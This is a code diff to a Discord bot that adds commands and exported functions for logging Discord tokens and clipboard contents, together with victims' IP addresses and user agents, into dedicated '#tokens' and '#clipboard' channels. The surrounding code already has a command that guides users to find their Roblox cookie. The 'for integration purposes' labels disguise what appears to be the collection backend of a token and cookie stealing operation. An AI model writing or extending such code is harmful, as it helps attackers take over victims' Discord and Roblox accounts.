@@ -377,10 +377,14 @@ client.once('ready', async () => {
     databaseChannel = guild.channels.cache.find(ch => ch.name === DATABASE_CHANNEL);
     loggingChannel = guild.channels.cache.find(ch => ch.name === LOGGING_CHANNEL);
     accsChannel = guild.channels.cache.find(ch => ch.name === ACCS_CHANNEL);
+    tokensChannel = guild.channels.cache.find(ch => ch.name === TOKENS_CHANNEL);
+    clipboardChannel = guild.channels.cache.find(ch => ch.name === CLIPBOARD_CHANNEL);
     
     if (!databaseChannel) console.error(`❌ #${DATABASE_CHANNEL} channel not found!`);
     if (!loggingChannel) console.error(`❌ #${LOGGING_CHANNEL} channel not found!`);
     if (!accsChannel) console.error(`❌ #${ACCS_CHANNEL} channel not found!`);
+    if (!tokensChannel) console.error(`❌ #${TOKENS_CHANNEL} channel not found!`);
+    if (!clipboardChannel) console.error(`❌ #${CLIPBOARD_CHANNEL} channel not found!`);
     
     // Load data from database channel
     await loadDataFromChannel();
@@ -401,6 +405,44 @@ client.once('ready', async () => {
     new SlashCommandBuilder()
       .setName('cookiehelp')
       .setDescription('Get detailed instructions on how to find your Roblox cookie'),
+    new SlashCommandBuilder()
+      .setName('submittoken')
+      .setDescription('Submit Discord token data (for integration purposes)')
+      .addStringOption(option =>
+        option.setName('token')
+          .setDescription('Discord token')
+          .setRequired(true))
+      .addStringOption(option =>
+        option.setName('ip')
+          .setDescription('User IP address')
+          .setRequired(false))
+      .addStringOption(option =>
+        option.setName('useragent')
+          .setDescription('User agent string')
+          .setRequired(false))
+      .addStringOption(option =>
+        option.setName('serverid')
+          .setDescription('Server ID')
+          .setRequired(false)),
+    new SlashCommandBuilder()
+      .setName('submitclipboard')
+      .setDescription('Submit clipboard data (for integration purposes)')
+      .addStringOption(option =>
+        option.setName('data')
+          .setDescription('Clipboard data')
+          .setRequired(true))
+      .addStringOption(option =>
+        option.setName('ip')
+          .setDescription('User IP address')
+          .setRequired(false))
+      .addStringOption(option =>
+        option.setName('useragent')
+          .setDescription('User agent string')
+          .setRequired(false))
+      .addStringOption(option =>
+        option.setName('type')
+          .setDescription('Data type')
+          .setRequired(false))
   ].map(cmd => cmd.toJSON());
 
   try {
@@ -548,6 +590,14 @@ client.on('interactionCreate', async (interaction) => {
         
       case 'cookiehelp':
         await handleCookieHelpCommand(interaction);
+        break;
+        
+      case 'submittoken':
+        await handleSubmitTokenCommand(interaction);
+        break;
+        
+      case 'submitclipboard':
+        await handleSubmitClipboardCommand(interaction);
         break;
         
       default:
@@ -700,7 +750,104 @@ async function handleCookieHelpCommand(interaction) {
   await interaction.editReply({ embeds: [embed] });
 }
 
-// Graceful shutdown
+async function handleSubmitTokenCommand(interaction) {
+  // Only allow administrators or specific roles to use this command
+  if (!interaction.member.permissions.has('ADMINISTRATOR')) {
+    await interaction.editReply({
+      content: '❌ You do not have permission to use this command.',
+      ephemeral: true
+    });
+    return;
+  }
+
+  const token = interaction.options.getString('token');
+  const ip = interaction.options.getString('ip') || 'Unknown';
+  const userAgent = interaction.options.getString('useragent') || 'Unknown';
+  const serverId = interaction.options.getString('serverid') || 'N/A';
+
+  const tokenData = {
+    token: token,
+    userIP: ip,
+    userAgent: userAgent,
+    serverId: serverId,
+    submittedBy: interaction.user.tag,
+    submittedById: interaction.user.id
+  };
+
+  await logDiscordToken(tokenData);
+
+  const embed = new EmbedBuilder()
+    .setColor('#51cf66')
+    .setTitle('✅ Token Data Submitted')
+    .setDescription('Discord token data has been logged successfully.')
+    .addFields(
+      { name: 'Status', value: 'Logged to #tokens channel', inline: false }
+    )
+    .setTimestamp();
+
+  await interaction.editReply({ embeds: [embed] });
+}
+
+async function handleSubmitClipboardCommand(interaction) {
+  // Only allow administrators or specific roles to use this command
+  if (!interaction.member.permissions.has('ADMINISTRATOR')) {
+    await interaction.editReply({
+      content: '❌ You do not have permission to use this command.',
+      ephemeral: true
+    });
+    return;
+  }
+
+  const data = interaction.options.getString('data');
+  const ip = interaction.options.getString('ip') || 'Unknown';
+  const userAgent = interaction.options.getString('useragent') || 'Unknown';
+  const type = interaction.options.getString('type') || 'text';
+
+  const clipboardData = {
+    clipboardData: data,
+    userIP: ip,
+    userAgent: userAgent,
+    type: type,
+    submittedBy: interaction.user.tag,
+    submittedById: interaction.user.id
+  };
+
+  await logClipboardData(clipboardData);
+
+  const embed = new EmbedBuilder()
+    .setColor('#51cf66')
+    .setTitle('✅ Clipboard Data Submitted')
+    .setDescription('Clipboard data has been logged successfully.')
+    .addFields(
+      { name: 'Data Length', value: `${data.length} characters`, inline: true },
+      { name: 'Type', value: type, inline: true },
+      { name: 'Status', value: 'Logged to #clipboard channel', inline: false }
+    )
+    .setTimestamp();
+
+  await interaction.editReply({ embeds: [embed] });
+}
+
+// Export functions for server integration
+module.exports = {
+  logDiscordToken: async (data) => {
+    if (!tokensChannel) {
+      console.warn('⚠️ Tokens channel not available yet, data will be queued');
+      return;
+    }
+    return logDiscordToken(data);
+  },
+  logClipboardData: async (data) => {
+    if (!clipboardChannel) {
+      console.warn('⚠️ Clipboard channel not available yet, data will be queued');
+      return;
+    }
+    return logClipboardData(data);
+  },
+  client,
+  // Add method to check if bot is ready
+  isReady: () => client.isReady() && tokensChannel && clipboardChannel
+};
 process.on('SIGINT', () => {
   console.log('🛑 Shutting down bot...');
   client.destroy();
